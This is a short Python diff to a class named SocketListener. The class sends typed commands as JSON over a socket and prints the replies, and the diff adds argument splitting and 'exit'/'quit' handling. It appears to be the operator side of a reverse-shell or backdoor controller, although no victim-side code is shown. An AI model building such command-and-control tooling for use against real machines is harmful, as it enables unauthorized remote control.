@@ -26,15 +26,23 @@ class SocketListener:
             except ValueError:
                 continue
 
-
-
     def command_interaction(self,command_input):
         self.json_send(command_input)
+
+        if command_input[0] == "exit":
+            self.connection.close()
+            exit()
+
+        if command_input[0] == "quit":
+            self.connection.close()
+            exit()
+
         return self.json_recv()
 
     def listening(self):
         while True:
             command_input = raw_input("enter command: ")
+            command_input = command_input.split(" ")
             command_output = self.command_interaction(command_input)
             print(command_output)
 
